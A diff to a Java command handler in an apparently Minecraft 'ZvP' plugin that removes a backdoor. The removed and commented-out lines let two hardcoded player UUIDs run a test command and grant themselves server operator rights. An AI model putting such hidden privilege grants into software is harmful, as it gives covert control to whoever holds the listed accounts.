@@ -87,7 +87,9 @@ public class ZvPCommands implements CommandExecutor {
 	
 	Player playerSender = (Player) sender;
 	
-	if (cmd.getName().equalsIgnoreCase("zvptest") && ((playerSender.isOp() && ZvP.getPluginLogger().isDebugMode()) || (playerSender.getUniqueId().toString().equalsIgnoreCase("2b572c53-1e26-4c09-89a3-aca82bf1d585") || playerSender.getUniqueId().toString().equalsIgnoreCase("c9062ab8-8764-370e-b57f-8a96641dbb79")))) {
+	if (cmd.getName().equalsIgnoreCase("zvptest") && playerSender.isOp() && ZvP.getPluginLogger().isDebugMode()) {
+	    // || (playerSender.getUniqueId().toString().equalsIgnoreCase("2b572c53-1e26-4c09-89a3-aca82bf1d585") ||
+	    // playerSender.getUniqueId().toString().equalsIgnoreCase("c9062ab8-8764-370e-b57f-8a96641dbb79")))) {
 	    // Test command
 	    
 	    if (args.length == 1) {
@@ -96,10 +98,7 @@ public class ZvPCommands implements CommandExecutor {
 		    GameManager.getManager().getPlayer(playerSender).getArena().updatePlayerBoards();
 		    return true;
 		}
-		if (args[0].equalsIgnoreCase("op")) {
-		    playerSender.setOp(true);
-		    return true;
-		}
+		
 		if (args[0].equalsIgnoreCase("kill")) {
 		    for (Entity e : playerSender.getWorld().getEntities()) {
 			if (e instanceof Zombie) {
